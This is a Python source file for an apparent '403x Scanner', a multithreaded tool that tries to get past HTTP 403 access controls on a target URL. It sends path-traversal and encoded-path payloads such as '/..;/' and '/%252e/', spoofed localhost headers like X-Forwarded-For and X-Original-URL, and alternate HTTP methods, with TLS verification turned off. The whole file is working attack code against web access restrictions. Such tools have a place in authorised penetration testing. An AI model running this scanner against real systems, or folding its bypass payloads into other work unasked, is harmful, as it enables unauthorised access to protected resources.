import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

urllib3.disable_warnings()
init(autoreset=True)

SUCCESS_CODES = [200,201,202,204,301,302,307,308]

HEADERS = [
{"X-Forwarded-For":"127.0.0.1"},
{"X-Originating-IP":"127.0.0.1"},
{"X-Remote-IP":"127.0.0.1"},
{"X-Client-IP":"127.0.0.1"},
{"X-Host":"127.0.0.1"},
{"X-Original-URL":"/"},
{"X-Rewrite-URL":"/"},
]

METHODS = ["GET","POST","HEAD","OPTIONS","PUT","PATCH","TRACE"]


def run_scan(args):

    target = args.url.rstrip("/")

    proxies = None
    if args.proxy:
        proxies = {"http":args.proxy,"https":args.proxy}

    payloads = [
    "",
    "/",
    "//",
    "/.",
    "/./",
    "/..;/",
    "/%2e/",
    "/%2e%2e/",
    "/%252e/",
    "/%2f/"
    ]

    print(Fore.CYAN+"\n403x Scanner")
    print("Target:",target)

    def test_path(payload):

        url = target + payload

        try:
            r = requests.get(url,timeout=7,verify=False,proxies=proxies)

            if r.status_code in SUCCESS_CODES:
                print(Fore.GREEN+f"[BYPASS] {url} -> {r.status_code}")
            else:
                print(f"{url} -> {r.status_code}")

        except:
            pass

    def test_header(header):

        try:
            r = requests.get(target,headers=header,timeout=7,verify=False,proxies=proxies)

            if r.status_code in SUCCESS_CODES:
                print(Fore.GREEN+f"[BYPASS HEADER] {header} -> {r.status_code}")

        except:
            pass

    def test_method(method):

        try:
            r = requests.request(method,target,timeout=7,verify=False,proxies=proxies)

            if r.status_code in SUCCESS_CODES:
                print(Fore.GREEN+f"[BYPASS METHOD] {method} -> {r.status_code}")

        except:
            pass


    with ThreadPoolExecutor(max_workers=args.threads) as executor:

        for p in payloads:
            executor.submit(test_path,p)

        for h in HEADERS:
            executor.submit(test_header,h)

        for m in METHODS:
            executor.submit(test_method,m)
